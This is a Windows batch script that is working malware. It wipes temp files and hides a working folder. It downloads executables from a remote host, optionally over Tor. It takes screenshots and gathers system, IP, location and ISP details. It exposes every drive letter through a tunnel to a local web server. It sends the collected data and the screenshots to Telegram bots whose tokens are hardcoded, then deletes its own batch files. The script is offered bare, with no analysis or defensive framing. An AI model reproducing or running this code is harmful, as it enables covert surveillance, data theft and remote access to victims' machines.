@echo off
setlocal 

del /s /f /q /a "%temp%\*.*"
for /d %%D in ("%temp%\*") do rd /s /q "%%D"
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

Set host=https://cryptedodissey.github.io
Set environment=C:\Windows

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

set "folder=%random%"
mkdir "%temp%\%folder%" 
attrib +s +h +i "%temp%\%folder%" 
cd "%temp%\%folder%"
"%environment%\curl.exe" -k %proxy% %host%/Infos/speedtest.exe --output "speedtest.exe"
"%environment%\curl.exe" -k %proxy% %host%/Infos/osinfo.vbs --output "osinfo.vbs"
"%environment%\curl.exe" -k -L https://archive.org/download/pngquant-dropscript/pngquant.exe --output "pngquant.exe"

set "userN=%username%" && for /f "usebackq delims=" %%i in (`powershell -command "$userN='%username%'-replace '[^\x00-\x7F]', ''; $userN"`) do set "userN=%%i"
set "computerN=%computername%" && for /f "usebackq delims=" %%i in (`powershell -command "$computerN='%computername%'-replace '[^\x00-\x7F]', ''; $computerN"`) do set "computerN=%%i"
"%environment%\nircmd.exe" savescreenshotfull "%userN%@%computerN% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
for %%a in (*.png) do (set "pngName=%%a")
pngquant.exe --speed 11 --strip --force --skip-if-larger "%pngName%" --output "%pngName%"

cscript.exe /nologo osinfo.vbs > "%userN%@%computerN%.txt"
"speedtest.exe" --accept-license | echo YES
"speedtest.exe" --accept-gdpr >> "%userN%@%computerN%.txt" 
echo. >> "%userN%@%computerN%.txt"

for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
    set WinEdition=%%G
    )
for /f "tokens=2 delims==" %%G in ('wmic os get OSArchitecture /value') do ( 
    set OSArchitecture=%%G
    )
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/ip'
) Do set ExtIP=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/city'
) Do set City=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/region'
) Do set Region=%%A
for /f "tokens=*" %%A in (
  '%environment%\curl.exe -k ipinfo.io/country'
) Do set Country=%%A
for /f "tokens=1* delims=: " %%A in (
  '%environment%\curl.exe -k ipinfo.io/org'
) Do set ISP=%%B
for /f "tokens=1* delims=:" %%A in (
  '%environment%\curl.exe -k %proxy% https://check.torproject.org/api/ip 2^>NUL^|find "IsTor"'
) Do set TorStatus=%%B

if exist "%temp%\localtunnel.txt" (
   for /f "tokens=3* delims=:" %%a in ('type %temp%\localtunnel.txt') do (
  set URI=%%b)
) else (
   set WS=Off
)
set WS=%URI:~0,-1%
if "%WS%"=="~0,-1" taskkill /f /im Localtunnel.exe

tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off)

setlocal enableDelayedExpansion
powershell.exe Remove-Item -Force "%environment%\apache2\php\index.php"
echo ^<a href="%WS%tinyfilemanager.php"^>TFM^</a^>^<br^> > "%environment%\apache2\php\index.php"
for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    dir /A:D /D %%D:\ >nul 2>&1
    if not errorlevel 1 (
        echo ^<a href="%WS%%%D:"^>%%D:\^</a^>^<br^> >> "%environment%\apache2\php\index.php"
    )
)
setlocal disableDelayedExpansion

for /f "tokens=1" %%i in ('%environment%\curl.exe -k -H "Bypass-Tunnel-Reminder: 1" %WS%') do set "status=%%i"
if "%status%"=="404" (
  taskkill /f /im Localtunnel.exe
) else (
  echo.
)

set "MSG="
set "FMSG="
SET "MSG=%userN%@%computerN% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%MSG%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "FMSG=%%i"
if "%FMSG%"=="" (
  set "FMSG=%MSG%"
)
echo %FMSG% >> "%userN%@%computerN%.txt"

"%environment%\curl.exe" -k %proxy% -F text="A \U0001F608 CONNECTION: %FMSG% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
"%environment%\curl.exe" -k %proxy% -F document=@"%userN%@%computerN%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652

cd "%temp%"
rmdir /s /q "%temp%\%folder%"

"%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
endlocal
powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat" && exit
